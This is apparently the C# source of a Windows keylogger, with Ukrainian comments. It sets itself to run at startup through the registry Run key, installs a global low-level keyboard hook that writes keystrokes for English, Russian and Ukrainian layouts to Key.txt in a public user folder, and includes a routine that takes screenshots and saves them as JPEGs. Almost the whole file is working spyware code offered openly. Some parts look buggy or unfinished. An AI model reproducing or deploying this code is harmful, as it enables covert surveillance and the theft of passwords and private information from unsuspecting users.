using System;
using System.ComponentModel;
using System.IO;
using System.Text;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Interop;
using System.Collections.Generic;


namespace Keylogger
{

    #region AutoRun

    public class AutoRun
    {
        public static bool SetAutoRun(bool autorun, string path)
        {
            const string name = "Keylogger";
            string EXEpath = path;
            RegistryKey reg;

            //відкриваєм 
            reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");

            try
            {
                if (autorun)
                {
                    try
                    {
                        reg.SetValue(name, EXEpath);
                        //MessageBox.Show("AutoRun TRUE");
                        //MessageBox.Show(Environment.OSVersion.ToString());
                    }
                    catch (NullReferenceException ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
                else
                {
                    reg.DeleteValue(name);
                    //MessageBox.Show("AutoRun FALSE");
                }
                reg.Flush();//
                reg.Close();
                //
            }

            catch
            {
                return false;
            }

            return true;
        }

        public static string Path()
        {
            int majorVer = Environment.OSVersion.Version.Major;
            string path;
            //MessageBox.Show(Environment.OSVersion.Version.Minor.ToString());
            //Windows XP
            string str = Environment.SystemDirectory.Remove(3);

            //MessageBox.Show(str);
            if (majorVer < 6)
            {
                path = str + @"Documents and Settings\All Users\";
                return path;
            }
            else
            {
                path = str + @"Users\Public\";
                return path;
            }

        }

        //public static bool SetStealth;

    }

    #endregion

    #region Keylogger
      
    internal class Keylog
    {
        private const int WH_KEYBOARD_LL = 13;

        private StringBuilder sb = new StringBuilder();
        private LowLevelKeyboardProcDelegate m_callback;
        private IntPtr m_hHook;


        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn,
            IntPtr hMod, int dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(
            IntPtr hhk,
            int nCode, IntPtr wParam, IntPtr lParam);

        private static readonly char[] EKey = new char[] {'A', 'S', 'D', 'F', 'Q', 'W', 'E', 'R',
            'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', 'G', 'H', 'J',  'K', 'L', ';', '\'',
            '`', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/',
            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' };
        private static readonly char[] RKey = new char[] { 'Ф', 'Ы', 'В', 'А', 'Й', 'Ц', 'У', 'К', 'Е',
            'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ъ', 'П', 'Р', 'О', ' ', 'Л', 'Д', 'Ж', 'Э', 'Ё', 'Я',
            'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', '.',
            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
        private  static readonly char[] UKey = new char[]{
            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ї', 'Ф', 'І', 'В', 'А', 'П',
            'Р', 'О', 'Л', 'Д', 'Ж', 'Є', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', '.',
            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
        private  static readonly int [] Ikey = new int[] {}; 
        private IntPtr LowLevelKeyboardHookProc(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0)
            {
                return CallNextHookEx(m_hHook, nCode, wParam, lParam);
            }
            else
            {
                var khs = (KeyboardHookStruct)
                          Marshal.PtrToStructure(lParam,
                          typeof(KeyboardHookStruct));

                //Debug.Print("Hook: Code: {0}, WParam: {1},{2},{3},{4} ",
                //            nCode, wParam, lParam,
                //            khs.VirtualKeyCode,
                //            khs.ScanCode, khs.Flags, khs.Time);
                

                //Debug.Print(khs.VirtualKeyCode.ToString());
                //MessageBox.Show(khs.VirtualKeyCode.ToString());
                FileStream fs = null;
                FileInfo fi = null;
                StreamWriter sw = null;
                string ilm = InputLanguageManager.Current.CurrentInputLanguage.ToString();
                
                try
                {
                    fi = new FileInfo(AutoRun.Path() + "Key.txt");
                    fs = fi.Open(FileMode.OpenOrCreate, FileAccess.Write, FileShare.Write);
                    sw = new StreamWriter(fs);
                    //MessageBox.Show(ilm);
                    //string str = khs.VirtualKeyCode.ToString();
                    if (ilm == "en-US")
                    {
                        for (int i = 0; i < EKey.Length; i++)
                        {
                            //MessageBox.Show("ENG");
                            if (khs.VirtualKeyCode == EKey[i])
                            {
                               // MessageBox.Show("EKEY: " + EKey[i] + "VKC: " + khs.VirtualKeyCode);
                                sw.WriteLine(sb.Append(EKey[i]));
                            }
                        }
                    }
                    else if (ilm == "ru-RU")
                    {
                        for (int i = 0; i < RKey.Length; i++)
                        {
                            
                            if (khs.VirtualKeyCode == RKey[i])
                                sw.WriteLine(sb.Append(RKey[i]));
                        }
                    }
                    else if(ilm == "uk-UA")
                    {
                        for (int i = 0; i < UKey.Length; i++)
                        {
                            //MessageBox.Show("UKEY: " + UKey[i] + "VKC: " + khs.VirtualKeyCode);
                            if (khs.VirtualKeyCode   == UKey[i])
                            {
                                sw.WriteLine(sb.Append(UKey[i]));
                                //MessageBox.Show("UKR"); не працює
                            }
                        }
                    }

                }

                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }

                finally
                {
                    sw.Close();
                }

                return CallNextHookEx(m_hHook, nCode, wParam, lParam);

                //if (khs.VirtualKeyCode == 9 &&
                //    wParam.ToInt32() == 260 &&
                //    khs.ScanCode == 15) //alt+tab
                //{

                //    System.Console.WriteLine("Alt+Tab pressed!");
                //    IntPtr val = new IntPtr(1);
                //    return val;
                //}
                //else
                //{
                //    return CallNextHookEx(m_hHook, nCode, wParam, lParam);
                //}

            }
        }


        [StructLayout(LayoutKind.Sequential)]
        private struct KeyboardHookStruct
        {
            public readonly int VirtualKeyCode;
            public readonly int ScanCode;
            public readonly int Flags;
            public readonly int Time;
            public readonly IntPtr ExtraInfo;
        }


        private delegate IntPtr LowLevelKeyboardProcDelegate(
            int nCode, IntPtr wParam, IntPtr lParam);


        public void SetHook()
        {
            m_callback = LowLevelKeyboardHookProc;
            m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                m_callback,
                GetModuleHandle(IntPtr.Zero), 0);
        }


        public void Unhook()
        {
            UnhookWindowsHookEx(m_hHook);
        }


    }
    #endregion

    #region TESTS

    class globalKeyboardHook
    {
        #region Constant, Structure and Delegate Definitions

        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        public bool _hookAll = false;
        public bool HookAllKeys
        {
            get
            {
                return _hookAll;
            }
            set
            {
                _hookAll = value;
            }
        }
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        #endregion

        #region Instance Variables

        public List<System.Windows.Forms.Keys> HookedKeys = new List<System.Windows.Forms.Keys>();

        IntPtr hhook = IntPtr.Zero;
        keyboardHookProc khp;
        #endregion

        #region Events

        public event System.Windows.Forms.KeyEventHandler KeyDown;

        public event System.Windows.Forms.KeyEventHandler KeyUp;
        #endregion

        #region Constructors and Destructors

        public globalKeyboardHook()
        {
            khp = new keyboardHookProc(hookProc);
            hook();
        }

        ~globalKeyboardHook()
        {
            unhook();
        }
        #endregion

        #region Public Methods

        public void hook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, hInstance, 0);
        }


        public void unhook()
        {
            UnhookWindowsHookEx(hhook);
        }

        public int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
        {
            if (code >= 0)
            {
                System.Windows.Forms.Keys key = (System.Windows.Forms.Keys)lParam.vkCode;
                if (_hookAll ? true : HookedKeys.Contains(key))
                {
                    System.Windows.Forms.KeyEventArgs kea = new System.Windows.Forms.KeyEventArgs(key);
                    if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                    {
                        KeyDown(this, kea);
                    }
                    else if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (KeyUp != null))
                    {
                        KeyUp(this, kea);
                    }
                    if (kea.Handled)
                        return 1;
                }
            }
            return CallNextHookEx(hhook, code, wParam, ref lParam);
        }

        #endregion

        #region DLL imports

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        /// <summary>
        /// Unhooks the windows hook.
        /// </summary>
        /// <param name="hInstance">The hook handle that was returned from SetWindowsHookEx</param>
        /// <returns>True if successful, false otherwise</returns>
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        /// <summary>
        /// Calls the next hook.
        /// </summary>
        /// <param name="idHook">The hook id</param>
        /// <param name="nCode">The hook code</param>
        /// <param name="wParam">The wparam.</param>
        /// <param name="lParam">The lparam.</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        /// <summary>
        /// Loads the library.
        /// </summary>
        /// <param name="lpFileName">Name of the library</param>
        /// <returns>A handle to the library</returns>
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        #endregion
    }

    #endregion

    #region ScreenShot

    static class BMP
    {
        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool DeleteObject(IntPtr hObject);

        public static BitmapSource ToBitmapSource(this System.Drawing.Bitmap source)
        {
            var hBitmap = source.GetHbitmap();

            try
            {
                return System.Windows.Interop.Imaging.CreateBitmapSourceFromHBitmap(
                    hBitmap,
                    IntPtr.Zero,
                    Int32Rect.Empty,
                    BitmapSizeOptions.FromEmptyOptions());
            }
            catch (Win32Exception)
            {
                return null;
            }
            finally
            {
                //NativeMethods.DeleteObject(hBitmap);
            }
        }
    }

    public static class ScreenShot
    {
        
        static BitmapEncoder bitmapenc;
        static BitmapSource bitmapsource;
        static JpegBitmapEncoder jpeg;

        [System.Runtime.InteropServices.DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr onj);

        private static BitmapSource TakeScreen()
        {


            Bitmap bitmap;
            BitmapSource bitmapsource = null;

            bitmap = new Bitmap((int) SystemParameters.PrimaryScreenWidth, (int) SystemParameters.PrimaryScreenHeight,
               System.Drawing.Imaging.PixelFormat.Format32bppArgb);

            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            }
            IntPtr handle = IntPtr.Zero;
            try
            {
                handle = bitmap.GetHbitmap();
                bitmapsource = Imaging.CreateBitmapSourceFromHBitmap(handle, IntPtr.Zero, Int32Rect.Empty,
                    BitmapSizeOptions.FromEmptyOptions());

            }
            catch (Exception)
            {

            }

            finally
            {
                DeleteObject(handle);
            }

            return bitmapsource;

        }

        public static void ScreenSave(string numscreen)
        {
            string path = AutoRun.Path() + numscreen + ".jpg";
            bitmapsource = ScreenShot.TakeScreen();
            jpeg = new JpegBitmapEncoder();
            jpeg.Frames.Add(BitmapFrame.Create(bitmapsource));
            FileStream fs = null;

            try
            {
                fs= new FileStream(path,FileMode.Create, FileAccess.Write);
                jpeg.Save(fs);
            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }

            finally
            {
                fs.Close();
            }
        }

    }

#endregion

    public enum WindowsHotKey
    {
        Alt = 0x0001,
        Ctrl = 0x0002,
        Shift = 0x0004,
        V = 0x56,
        F12 = 0x7B,
        ESC = 0x1B,
        None = 0x0
    }

    


}